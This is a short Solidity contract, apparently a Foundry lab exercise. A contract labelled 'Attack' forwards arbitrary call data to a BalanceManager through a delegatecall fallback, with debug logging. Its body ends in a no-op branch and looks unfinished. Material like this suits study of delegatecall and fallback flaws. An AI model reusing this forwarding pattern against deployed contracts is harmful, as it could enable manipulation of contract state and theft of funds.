// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "./BalanceManager.sol";

contract BalanceManagerHacker {

    BalanceManager manager;  

    constructor(BalanceManager _manager) {
        manager = _manager;
    }

    //Attack
    fallback() external {
        console.log("fallback dropBalanceHacker");
        console.logBytes(msg.data);
        
        (bool result, bytes memory returnedData) = address(manager).delegatecall(msg.data);
        console.log(result);
        console.logBytes(returnedData);
        if (result) {
        this;
        }
    }
}